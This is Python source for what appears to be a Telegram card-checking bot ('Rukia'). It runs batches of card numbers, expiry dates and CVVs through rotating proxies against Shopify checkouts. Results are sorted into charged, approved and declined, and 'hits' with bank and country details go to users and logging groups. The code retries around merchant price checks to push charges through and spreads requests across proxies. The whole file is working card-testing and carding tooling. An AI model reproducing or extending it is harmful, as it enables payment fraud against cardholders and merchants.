# same input). That means the first call from every session tries
# the same proxy first -- concentrating load on one proxy.
#
# Fix: at __init__ time, rotate each new ProxyManager deque by a
# global cursor that advances by len(proxies) per session. So when
# session A starts with offset=0 and session B starts 0.2s later
# with offset=N, their workers start hitting DIFFERENT proxies.
#
# The cursor is module-level (asyncio single-threaded) and monotonic,
# so even under 20 simultaneous session starts the offsets stay
# distinct and no proxy gets the "default" first-call privilege.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_PROXY_ROUND_ROBIN_COUNTER: int = 0

def _next_proxy_session_offset(num_proxies: int) -> int:
    """
    Return a unique rotation offset for a fresh ProxyManager deque,
    then advance the global cursor by num_proxies so the NEXT session
    starts at a different offset. If num_proxies <= 0, return 0.
    """
    global _PROXY_ROUND_ROBIN_COUNTER
    if num_proxies <= 0:
        return 0
    # Advance by exactly 1 (NOT num_proxies) per session, otherwise for
    # N=10 proxies the offsets go 0, 10, 20, ... which all mod-10 == 0
    # and every session starts at proxy[0].
    offset = _PROXY_ROUND_ROBIN_COUNTER % num_proxies
    _PROXY_ROUND_ROBIN_COUNTER += 1
    return offset


def get_user_display(user_obj, plan_name):
    plan_lower = str(plan_name or "").strip().lower()
    if plan_lower and plan_lower not in ("trial", "free", "none", ""):
        # Sanitize plan_name — strip <tg-emoji> tags so the .txt report
        # shows "Shivansh (Super ⭐)" not "Shivansh (Super <tg-emoji...>)".
        safe_plan = _sanitize_plan_name(plan_name)
        return f"{user_obj.first_name} ({safe_plan})"
    return f"{user_obj.first_name}"


# ━━━ CURRENCY DISPLAY ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Used by _format_price_display to convert the API's amount string (which
# sometimes includes a baked-in currency symbol like '1.00$' or '151.00£')
# into a clean 'Shopify $X.XX USD' line for DM / group / .txt output.
_CURRENCY_SYMBOL_TO_CODE = {
    "$":   "USD",
    "£":   "GBP",
    "€":   "EUR",
    "A$":  "AUD",
    "C$":  "CAD",
    "NZ$": "NZD",
    "S$":  "SGD",
}


def _detect_currency_symbol(price_str) -> str | None:
    """Detect currency symbol from price strings like '1.00$', '151.00£', '62.00A$'.

    Returns the symbol ('$', '£', '€', 'A$', etc.) or None if not detected.
    Multi-char symbols (A$, C$, NZ$, S$) are tried FIRST so 'A$' isn't misread as '$'.
    """
    if not price_str:
        return None
    s = str(price_str).strip()
    for sym in ("NZ$", "A$", "C$", "S$"):
        if sym in s:
            return sym
    for sym in ("$", "£", "€"):
        if sym in s:
            return sym
    return None


def _format_price_display(raw_price) -> str:
    """Build a clean 'Shopify {symbol}{amount} {code}' line for both the
    result txt file and the DM / group caption.

    Why this exists:
      - The Shopify API sometimes returns the amount WITH the currency
        symbol baked in (e.g. amount='1.00$', '151.00£', '62.00A$').
      - The old code blindly did `Shopify ${price}` → produced
        `Shopify $1.00$` (two $) or `Shopify $151.00£` (wrong currency).
      - Now we detect the symbol, strip it from the amount, and emit the
        correct symbol + ISO code (USD/GBP/EUR/AUD/...) so the user sees
        what the site actually charged in.

    Returns a stable, html-safe display string.
    """
    if raw_price is None or raw_price == "" or raw_price in ("N/A", "0.00"):
        return "Shopify 0.00 USD"

    s = str(raw_price).strip()
    sym = _detect_currency_symbol(s)
    code = _CURRENCY_SYMBOL_TO_CODE.get(sym, "USD")

    if sym:
        amount_str = s.replace(sym, "").replace(",", "").strip()
    else:
        amount_str = s

    try:
        amount = float(amount_str)
        amount_fmt = f"{amount:.2f}"
    except (ValueError, TypeError):
        amount_fmt = s

    return f"Shopify {sym or '$'}{amount_fmt} {code}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API PROCESSING FUNCTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str, api_idx: int | None = None) -> Tuple[bool, str, str, str, str, str, str, int]:
    """
    Process card using the API endpoint with 3-retry on price mismatch.

    Before the first call, we PROACTIVELY pre-fetch the site's cart total and
    pass it as `&price=X.XX` URL hint — this prevents the
    MERCHANDISE_EXPECTED_PRICE_MISMATCH GraphQL error from occurring at
    checkout time in the first place.

    If the pre-fetch fails (price endpoint missing, proxy hiccup, etc.), we
    fall back to the original REACTIVE retry: when the API returns
    MERCHANDISE_EXPECTED_PRICE_MISMATCH (or any similar price/currency
    transient), the call is retried up to 3 times with the site's actual
    price passed as the hint.

    Returns:
        Tuple of (success, message, url, gateway, price, currency, proxy_status, http_status)
    """
    import aiohttp

    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"

    # Price scraping is handled entirely by the remote API server
    # (desktop/ShopifyApi/api.py — fetch_products). Bot does NOT
    # pre-fetch the merchant's price itself; we just send the request
    # and let the API pick the correct cart amount + return it.
    price_hint: float | None = None

    logging.debug(f"[API] Processing {cc[:6]}**** via {mask_proxy(proxy)} (full={proxy!r})")

    # ━━━ PRICE MISMATCH RETRY ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Detects MERCHANDISE_EXPECTED_PRICE_MISMATCH / SALE_PRICE_MISMATCH /
    # MISMATCHED_BILL / CURRENCY_MISMATCH / etc. On match, retries up to
    # 3 times — refining `price_hint` to whatever the API reports in its
    # `amount`/`Price` field if available.
    #
    # Broadened the keyword list after user-reported MISMATCHED_BILL
    # (Shopify billing-currency check on the storefront order) wasn't
    # being caught by the reactive retry — was being misclassified as
    # a generic decline and short-circuited to DEAD status. Any of
    # these keywords implies the site is alive, the issue is JUST the
    # amount we sent, so retry-with-correct-amount is the right move.
    _PRICE_MISMATCH_KW = (
        "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
        "EXPECTED_PRICE_MISMATCH",
        "EXPECTED_LINE_ITEM_PRICE",
        "EXPECTED_PRICE",
        "CURRENCY_MISMATCH",
        "CURRENCY_NOT_SUPPORTED",
        "SALE_PRICE_MISMATCH",
        "SALE_ENDED",
        "PRICE_OUT_OF_RANGE",
        "MISMATCHED_BILL",
        "MISMATCHED_AMOUNT",
        "MISMATCHED_TOTAL",
        "BILL_MISMATCH",
        # Cart-state glitch — when delivery/shipping line changes mid
        # checkout (concurrent cartCreate races on same merchant's rate
        # cache), Shopify returns DELIVERY_DELIVERY_LINE_DETAIL_CHANGED.
        # Same plumbing as price-mismatch (inner retry with refreshed
        # amount); plus the outer RETRY_ERRORS rotates site/proxy.
        "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
        "DELIVERY_LINE_DETAIL_CHANGED",
        "CART_LINE_CHANGED",
    )
    MAX_PRICE_RETRIES = 5

    _api_t0 = time.monotonic()
    last_data: dict | None = None

    for attempt in range(1, MAX_PRICE_RETRIES + 1):
        try:
            data = await call_shopify_api(
                card=cc_formatted,
                site=site,
                proxy=proxy,
                timeout=40,
                price_hint=price_hint,
                api_idx=api_idx,
            )

            api_response = (
                data.get("error")
                or data.get("declined_reason")
                or data.get("response_text")
                or data.get("status")
                or "Unknown Error"
            )

            # Was this attempt a price-mismatch response?
            response_upper = (api_response or "").upper()
            is_price_mismatch = any(kw in response_upper for kw in _PRICE_MISMATCH_KW)

            # Has the API given us a usable site price to feed back as hint?
            new_amount = data.get("amount")
            try:
                new_price = float(str(new_amount).replace("$", "").replace(",", "").strip()) if new_amount not in (None, "", "0.00", 0, 0.0) else 0.0
            except (ValueError, TypeError):
                new_price = 0.0

            if is_price_mismatch and attempt < MAX_PRICE_RETRIES:
                # Refine price_hint with whatever the API just exposed —
                # if it didn't expose `amount` (some merchant configs don't),
                # keep using our pre-fetched price_hint. Either way, retry.
                #
                # SPECIAL CASE: MISMATCHED_BILL family fires on Shopify's
                # BILLING step (cartCreate succeeded, but cart/billing total
                # expected by the merchant-side Wallet/Stripe validation
                # doesn't match what we passed). In that case our `price=`
                # override is the PROBLEM, not the fix — the API must read
                # the cart's natural total instead. Clear price_hint on the
                # NEXT attempt so the API lets the cart flow drive the
                # amount. (shopify_api._build_params skips the `price=` set
                # when price_hint is None / 0.)
                _BILL_CLASH_KW = (
                    "MISMATCHED_BILL",
                    "BILL_MISMATCH",
                    "MISMATCHED_AMOUNT",
                    "MISMATCHED_TOTAL",
                )
                is_bill_clash = any(kw in response_upper for kw in _BILL_CLASH_KW)
                if is_bill_clash:
                    price_hint = None
                    last_data = data
                    logging.debug(
                        f"[API] MISMATCHED_BILL-family on attempt {attempt}/{MAX_PRICE_RETRIES} "
                        f"for {cc[:6]}**** — clearing price_hint to let API use cart's natural total, retrying"
                    )
                    continue
                if new_price > 0:
                    price_hint = new_price
                last_data = data
                if new_price > 0:
                    logging.debug(
                        f"[API] Price mismatch on attempt {attempt}/{MAX_PRICE_RETRIES} for "
                        f"{cc[:6]}**** — refining price to ${price_hint:.2f} and retrying"
                    )
                else:
                    logging.debug(
                        f"[API] Price mismatch on attempt {attempt}/{MAX_PRICE_RETRIES} for "
                        f"{cc[:6]}**** — retrying with existing price_hint (no new amount exposed)"
                    )
                continue

            # Either success (no mismatch), or retries exhausted → use this data
            _record_api_outcome(
                success=bool(data.get("success", False)),
                elapsed_ms=(time.monotonic() - _api_t0) * 1000,
            )

            gateway = data.get("gateway", "Shopify Payments")
            price = str(new_amount) if new_amount not in (None, "") else "0.00"
            success = bool(data.get("success", False))
            proxy_status = "Live" if success else "Dead"

            # ━━━ DIAGNOSTIC LOG — every successful API response ━━━
            # Logs price_hint vs returned amount so we can spot the $1 bug:
            #   * if price_hint = $X but amount = "1.00" → API is overriding
            #   * if price_hint = 1.0 always → scraper is broken
            #   * if amount matches price_hint but both are 1.0 → API charges $1
            if "CHARGED" in (api_response or "").upper():
                logging.warning(
                    f"[msh-DIAG] CHARGED for {cc[:6]}**** on {site[:40]}… | "
                    f"price_hint={price_hint!r} | raw_data={data!r} | "
                    f"new_amount={new_amount!r} | final_price={price!r}"
                )

            return (
                success,
                api_response,
                site,
                gateway,
                price,
                data.get("currency", "USD"),
                proxy_status,
                200,
            )

        except asyncio.CancelledError:
            raise
        except aiohttp.ClientError as e:
            _record_api_outcome(
                success=False,
                elapsed_ms=(time.monotonic() - _api_t0) * 1000,
            )
            return (
                False,
                f"Connection Error: {str(e)}",
                site,
                "Shopify Payments",
                "0.00",
                "USD",
                "Error",
                None
            )
        except Exception as e:
            _record_api_outcome(
                success=False,
                elapsed_ms=(time.monotonic() - _api_t0) * 1000,
            )
            return (
                False,
                f"Error: {str(e)}",
                site,
                "Shopify Payments",
                "0.00",
                "USD",
                "Error",
                None
            )

    # All retries exhausted on price mismatch — fall through with last result.
    # Shouldn't reach here in practice because the inner try always returns,
    # but kept as defensive terminal.
    if last_data:
        api_response = (
            last_data.get("error") or last_data.get("declined_reason")
            or last_data.get("response_text") or last_data.get("status") or "Unknown"
        )
        return (False, api_response, site, last_data.get("gateway", "Shopify Payments"),
                "0.00", last_data.get("currency", "USD"), "Dead", 200)
    return (False, "Price Mismatch (Retries Exhausted)", site,
            "Shopify Payments", "0.00", "USD", "Dead", 200)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE GENERATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    cards_list = []

    if result_type == "charged":
        cards_list = session.get('charged_cards', [])
        type_label = "Charged"
        type_emoji = "<tg-emoji emoji-id='6183613910977876404'>💎</tg-emoji>"
    elif result_type == "live":
        cards_list = session.get('live_cards', [])
        type_label = "Live"
        type_emoji = "<tg-emoji emoji-id='5310296284874159738'>✅</tg-emoji>"
    elif result_type == "dead":
        cards_list = session.get('dead_cards', [])
        type_label = "Dead"
        type_emoji = "<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji>"
    elif result_type == "errors":
        cards_list = session.get('error_cards', [])
        type_label = "Errors"
        type_emoji = "<tg-emoji emoji-id='5350572310627632617'>⚠️</tg-emoji>"
    else:
        cards_list = (
            session.get('charged_cards', []) +
            session.get('live_cards', []) +
            session.get('dead_cards', []) +
            session.get('error_cards', [])
        )
        type_label = "All"
        type_emoji = "📁"

    total_count = len(cards_list)
    user_display = get_user_display(user_obj, plan_name)

    lines = []
    lines.append("━━━━━━━━━━━━━━━━")
    lines.append(f"  Rukia  ·  {type_label}  ·  {total_count} cards")
    lines.append("━━━━━━━━━━━━━━━━")
    lines.append("")

    if total_count == 0:
        lines.append("⚠️ No cards found for this category")
    else:
        for card_data in cards_list:
            cc = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            bin_info = card_data.get('bin_info', {})
            price = card_data.get('price', 'N/A')

            scheme = bin_info.get('scheme', 'N/A')
            bank = bin_info.get('bank', 'N/A')
            country = bin_info.get('country', 'N/A')
            flag = bin_info.get('country_emoji', '')
            country_display = f"{flag} {country}" if flag else country

            response_upper = response.upper()
            response_lower = response.lower()
            response_normalized = response_upper.replace("_", " ")

            # Match the same classification as process_single_card so the
            # report file agrees with the live counters.
            if (
                "CHARGED" in response_upper
                or "ORDER_PAID" in response_upper
                or "ORDER PLACED" in response_normalized
                or "THANK YOU" in response_upper
            ):
                status_icon = "💎"
                status_label = "CHARGED"
            elif (
                "APPROVED" in response_upper
                or "INSUFFICIENT" in response_lower
                or "INCORRECT_CVC" in response_normalized
                or "INCORRECT_CVC" in response_upper
                or "INVALID_CVC" in response_normalized
                or "3D_AUTHENTICATION" in response_normalized
                or "3DS_REQUIRED" in response_normalized
                or "3DS" in response_upper
                or "OTP_REQUIRED" in response_upper
                or "OTP REQUIRED" in response_normalized
            ):
                status_icon = "✅"
                status_label = "APPROVED"
            elif any(
                d.upper().replace("_", " ") in response_normalized
                for d in DECLINED_RESPONSES
            ):
                status_icon = "❌"
                status_label = "DECLINED"
            elif (
                "TIMEOUT" in response_upper
                or "ERROR" in response_upper
                or "error" in response_lower
                or "timeout" in response_lower
            ):
                status_icon = "⚠️"
                status_label = "ERROR"
            else:
                status_icon = "❌"
                status_label = "DECLINED"

            lines.append(f"{status_icon} {cc}  [{status_label}]")
            lines.append(f"   {response}  ·  {_format_price_display(price)}")
            lines.append(f"   {scheme}  ·  {country_display}")
            lines.append(f"   {bank}")
            lines.append(f"   User: {user_display}")
            lines.append("")

    content = "\n".join(lines)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map = {
        "charged": "CHARGED", "live": "LIVE", "dead": "DEAD",
        "errors": "ERRORS", "all": "ALL",
    }
    filename = f"Rukia_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"

    return file_buffer, filename, total_count

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MESSAGE SENDING HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_name, proxy_status_formatted, price, is_approved: bool = False):
    # Debug-log premium plan detection to premium_plans.txt (skips NO PLAN / TRIAL).
    try:
        _log_premium_plan(
            getattr(user_obj, "id", None),
            getattr(user_obj, "username", None),
            plan_name,
        )
    except Exception:
        pass
    user_link = build_user_link(user_obj)
    gateway_display = html_escape(_format_price_display(price))
    safe_response = html_escape(str(response_msg))

    charged_eid = CUSTOM_CHARGED_EMOJI_ID
    approved_eid = CUSTOM_APPROVED_EMOJI_ID
    plan_lower = str(plan_name).strip().lower()
    plan_tag = ""
    if plan_lower and plan_lower not in ("trial", "free", "none", ""):
        # Sanitize plan_name: strip <tg-emoji> tags whose custom emoji IDs
        # may not be valid for this bot → keeps the plain fallback emoji
        # (e.g. ⭐) so Telegram never rejects the message.
        safe_plan = _sanitize_plan_name(plan_name)
        plan_tag = f" <i>({safe_plan})</i>"

    # Approved (INSUFFICIENT_FUNDS / INCORRECT_CVC / 3DS / OTP) vs Charged.
    if is_approved:
        status_emoji = f'<tg-emoji emoji-id="{approved_eid}">✅</tg-emoji>'
        status_label = "APPROVED"
    else:
        status_emoji = f'<tg-emoji emoji-id="{charged_eid}">💎</tg-emoji>'
        status_label = "CHARGED"

    caption = (
        f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
        f"  {status_emoji} "
        f"<b>HIT ➛ {status_label}</b> "
        f"{status_emoji}\n"
        f"┗━━━━━━━━━━━━━━━━━━━━┛\n"
        f"\n"
        f"<tg-emoji emoji-id=\"{EMOJI_FIRE}\">🔥</tg-emoji> "
        f"<b>Gateway ➛</b> {gateway_display}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_LIGHTNING}\">⚡</tg-emoji> "
        f"<b>Response ➛</b> <code>{safe_response}</code>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id=\"{EMOJI_STAR}\">👤</tg-emoji> "
        f"<b>User ➛</b> {user_link}{plan_tag}"
    )

    reply_markup = None

    try:
        await bot.send_message(
            chat_id=HIT_LOG_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Error sending hit log: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SHARED HIT-CARD UI BUILDER — used by APPROVED + CHARGED messages
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _build_hit_caption(
    cc_formatted: str,
    response_msg: str,
    bin_data: dict,
    api_price,
    user_obj,
    plan_name: str,
    is_charged: bool,
) -> str:
    """
    Builds a premium-looking hit card caption.
    is_charged=True  → <tg-emoji emoji-id='6183613910977876404'>💎</tg-emoji> CHARGED card (DM-pinned + extra charged group)
    is_charged=False → <tg-emoji emoji-id='5310296284874159738'>✅</tg-emoji> APPROVED card (DM only)
    """
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(_format_price_display(api_price))
    safe_response = html_escape(str(response_msg))
    safe_card = html_escape(cc_formatted)
    # Sanitize plan_name: strip <tg-emoji> tags whose custom emoji IDs
    # may not be valid for this bot → keeps the plain fallback emoji.
    safe_plan = _sanitize_plan_name(plan_name)
    user_link = build_user_link(user_obj)

    if is_charged:
        status_emoji = f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>'
        status_text = "CHARGED"
        plan_icon = f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>'
    else:
        status_emoji = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
        status_text = "Approved"
        plan_icon = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'

    # Plan badge — show only premium (non-TRIAL) plans
    plan_badge = ""
    plan_lower = str(plan_name).strip().lower()
    if plan_lower and plan_lower not in ("trial", "free", "none", ""):
        plan_badge = f" {plan_icon} <i>{safe_plan}</i>"

    return (
        # ━━━ Status line ━━━
        f"{status_emoji} <b>{status_text}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Card / Gateway / Response ━━━
        f"<tg-emoji emoji-id=\"5269501182258205420\">💳</tg-emoji> <b>Card ➛</b> <code>{safe_card}</code>\n"
        f"<tg-emoji emoji-id=\"6147670059822092505\">🔥</tg-emoji> <b>Gateway ➛</b> {gateway_display}\n"
        f"<tg-emoji emoji-id=\"5388849303982716989\">⚡</tg-emoji> <b>Response ➛</b> <code>{safe_response}</code>\n"
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ BIN info section ━━━
        f"<tg-emoji emoji-id=\"5922478782689579227\">🏷</tg-emoji> <b>Brand ➛</b> {bin_scheme}\n"
        f"<tg-emoji emoji-id=\"5350572310627632617\">🏛</tg-emoji> <b>Issuer ➛</b> {bin_bank}\n"
        f"<tg-emoji emoji-id=\"5350835008007324644\">🚩</tg-emoji> <b>Country ➛</b> {bin_country}\n"
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Footer ━━━
        f"<tg-emoji emoji-id=\"5433641741251011862\">👤</tg-emoji> <b>User ➛</b> {user_link}{plan_badge}\n"
        f"<tg-emoji emoji-id=\"5361979846845014099\">👑</tg-emoji> <b>Owner ➛</b> <a href=\"https://t.me/Im_in_so_love\"><b>Rukia</b></a>"
    )


async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name):
    """Always sends the approved hit to the user's DM (private chat)."""
    caption = _build_hit_caption(
        cc_formatted, response_msg, bin_data, api_price,
        user_obj, plan_name, is_charged=False,
    )

    # Send to user's DM as a plain message. The caption already has rich
    # custom Telegram emojis (rendered client-side) — no external GIF URL
    # dependency, so we never hit "wrong type of the web page content".
    await _safe_send_message_dm(
        bot,
        user_obj.id,
        text=caption,
        parse_mode="HTML",
    )

async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name):
    """Always sends the charged hit to the user's DM (private chat) + extra charged group."""
    caption = _build_hit_caption(
        cc_formatted, response_msg, bin_data, api_price,
        user_obj, plan_name, is_charged=True,
    )

    # Send to user's DM as a plain message. The caption already has rich
    # custom Telegram emojis (rendered client-side) — no external GIF URL
    # dependency, so we never hit "wrong type of the web page content".
    dm_msg = await _safe_send_message_dm(
        bot,
        user_obj.id,
        text=caption,
        parse_mode="HTML",
    )
    if dm_msg is not None:
        try:
            await bot.pin_chat_message(
                chat_id=user_obj.id,
                message_id=dm_msg.message_id,
                disable_notification=True,
            )
        except Exception as pe:
            logging.warning(f"[MSH] Could not pin charged hit for user {user_obj.id}: {pe}")

    # Also send to extra charged group log (plain message — same reason).
    try:
        await bot.send_message(
            chat_id=EXTRA_CHARGED_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.error(f"Could not send charged hit to extra group {EXTRA_CHARGED_GROUP_ID}: {e}")
    except Exception as e:
        logging.error(f"Error sending HIT to extra group: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS & PROGRESS MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    session = MSH_SESSIONS.get(session_id, {})

    approved_count = session.get('approved', 0)
    dead_count = session.get('dead', 0)
    charged_count = session.get('charged', 0)
    error_count = session.get('errors', 0)

    buttons = []

    buttons.append([
        {
            "text": f"Charged ({charged_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack(),
            "style": "primary",
            "icon_custom_emoji_id": BTN_CHARGED_EMOJI_ID
        },
        {
            "text": f"Approved ({approved_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack(),
            "style": "success",
            "icon_custom_emoji_id": BTN_LIVE_EMOJI_ID
        }
    ])

    buttons.append([
        {
            "text": f"Decline ({dead_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack(),
            "style": "danger",
            "icon_custom_emoji_id": BTN_DEAD_EMOJI_ID
        }
    ])

    if not is_running and error_count > 0:
        buttons.append([
            {
                "text": f"Retry Errors ({error_count})",
                "callback_data": MshRetryCallback(session_id=session_id).pack(),
                "style": "primary"
            }
        ])

    if is_running:
        buttons.append([
            {
                "text": "Stop",
                "callback_data": MshStopCallback(session_id=session_id).pack(),
                "style": "danger",
                "icon_custom_emoji_id": BTN_STOP_EMOJI_ID
            }
        ])

    return {"inline_keyboard": buttons}

async def update_progress_message(bot: Bot, session_id):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    current_time = time.time()
    last_update = session.get('last_update_time', 0)
    last_checked_count = session.get('last_update_checked', 0)
    cooldown_until = session.get('telegram_cooldown_until', 0)
    is_finished = session['status'] == "FINISHED"
    is_stopped = session['status'] == "STOPPED"
    checked = session.get('checked', 0)
    charged = session.get('charged', 0)
    approved = session.get('approved', 0)

    # ━━━ FORCE-UPDATE CONDITIONS ━━━━━━━━━━━━━━━━━━━━━━━
    # These override the throttle/cooldown so critical changes reach the
    # user even when Telegram is being aggressive with flood control.
    force_update = False
    force_reason = None

    # A) New charge or approved since last update → MUST show immediately,
    #    otherwise the user thinks the bot is broken / charges are lost.
    last_charged = session.get('last_update_charged', 0)
    last_approved = session.get('last_update_approved', 0)
    if charged > last_charged or approved > last_approved:
        force_update = True
        force_reason = (
            f"new {'charge' if charged > last_charged else ''}"
            f"{' + ' if charged > last_charged and approved > last_approved else ''}"
            f"{'approved' if approved > last_approved else ''}"
        )

    # B) >20 cards checked since last update → progress bar visibly stale.
    #    Lowered from 50 → 20 so the bar stays current even with high
    #    per-user concurrency (100 workers × 6s = ~16 cards/s).
    if (checked - last_checked_count) >= 20:
        force_update = True
        force_reason = f"+{checked - last_checked_count} cards since last update"

    # C) Last successful update was >4s ago AND counters changed.
    #    Lowered from 8s → 4s so the bar feels live even during throttle
    #    windows. Background updater now ticks at 1.5s so this rarely fires,
    #    but it catches cases where worker updates got rate-limited.
    elapsed_since_update = current_time - last_update
    if elapsed_since_update >= 4.0 and (checked > last_checked_count or charged > last_charged or approved > last_approved):
        force_update = True
        force_reason = f"stale ({elapsed_since_update:.1f}s since last update)"

    # Respect Telegram's RetryAfter cooldown UNLESS this is a forced update.
    # Forced updates WILL try to edit anyway — if Telegram rejects it again
    # the cooldown gets reset, but at least we attempted it.
    #
    # CHANGED: force-updates now ALSO respect cooldown. Previously a
    # forced edit during cooldown would re-extend it (line ~2362 below),
    # creating an indefinite "flood feedback loop" where the progress bar
    # froze at 38% while the worker count kept climbing in the background.
    # We still try force-resends (new message) after the cooldown expires
    # via the STALL-RESEND fallback, so the user never sees >5s of true
    # staleness.
    if current_time < cooldown_until and not is_finished and not is_stopped:
        return

    # Per-session throttle: 1.0s between edits under normal conditions.
    # Forced updates skip this entirely.
    if not is_finished and not is_stopped and not force_update:
        if elapsed_since_update < 1.0:
            return
        # Soft jitter window to desync concurrent sessions
        if elapsed_since_update < 1.0 + random.uniform(0, 0.1):
            return

    text = _build_progress_caption(session, session_id)

    if session.get('last_text') == text:
        return

    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()

    async with SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return

        is_running = session['status'] == "CHECKING"
        reply_markup = get_result_buttons(session_id, is_running=is_running)

        # ━━━ STALL RESEND: REMOVED in this rev ━━━━━━━━━━━━━━━━━━━━━━━━━
        # Was firing duplicate new-message drops: the "always on >10s
        # elapsed" branch kept firing while `last_update_time` comparisons
        # were crossing the threshold during worker bursts, causing the
        # bot to send 3-4 separate NEW progress messages per session
        # instead of editing the existing one.
        #
        # Replacement: just edit normally. If the message is truly gone
        # (TelegramBadRequest "message to edit not found"), the FALLBACK
        # block at the bottom of this function resends a fresh one — and
        # that's the only path that creates a new message now.
        # "always on >10s elapsed" branch kept firing while `last_update_time`
        # comparisons were crossing the threshold during worker bursts,
        # causing the bot to send 3-4 separate NEW progress messages per
        # session instead of editing the existing one.
        #
        # Replacement: just edit normally. If the message is truly gone
        # (TelegramBadRequest "message to edit not found"), the FALLBACK
        # block at the bottom of this function resends a fresh one — and
        # that's the only path that creates a new message now.
        try:
            await bot.edit_message_text(
                chat_id=session['chat_id'],
                message_id=session['msg_id'],
                text=text,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            session['last_text'] = text
            session['last_update_time'] = current_time
            session['last_update_checked'] = checked
            session['last_update_charged'] = charged
            session['last_update_approved'] = approved
            session['telegram_cooldown_until'] = 0  # clear any stale cooldown
            session['_progress_cooldown_streak'] = 0  # reset flood streak
            if force_update:
                logging.info(
                    f"[MSH] progress force-updated ({force_reason}) for session {session_id}"
                )
        except TelegramRetryAfter as e:
            # Exponential backoff to break the feedback loop: each consecutive
            # flood doubles the cooldown (capped at 5s). Capped aggressively
            # (down from 15s in earlier rev) because progress stalls >5s read
            # to the user as a hung bot. After cooldown expires the
            # STALL-RESEND fallback below sends a NEW message instead of
            # editing, which usually succeeds even after a flood because
            # edit_message and send_message are rate-limited independently.
            retry_seconds = min(5, getattr(e, 'retry_after', 5) or 5)
            prev_failures = session.get('_progress_cooldown_streak', 0) + 1
            cooldown_seconds = min(5, retry_seconds * (2 ** (prev_failures - 1)))
            session['_progress_cooldown_streak'] = prev_failures
            session['telegram_cooldown_until'] = current_time + cooldown_seconds
            logging.info(
                f"[MSH] Telegram flood control on progress edit — "
                f"streak={prev_failures}, cooling down for {cooldown_seconds:.1f}s "
                f"(session {session_id})"
            )
        except TelegramBadRequest as e:
            error_msg = str(e).lower()
            if "message is not modified" not in error_msg and "message to edit not found" not in error_msg:
                logging.error(f"[MSH] Error updating progress: {e}")
            # If the message is gone, mark it so we can send a fresh one
            if "message to edit not found" in error_msg:
                session['_progress_msg_dead'] = True
                logging.warning(
                    f"[MSH] Progress message gone for session {session_id} — "
                    f"will resend on next force-update"
                )
        except Exception as e:
            logging.error(f"[MSH] Error updating progress: {type(e).__name__}: {e}")

        # ━━━ FALLBACK: send a NEW progress message if the old one died ━━━
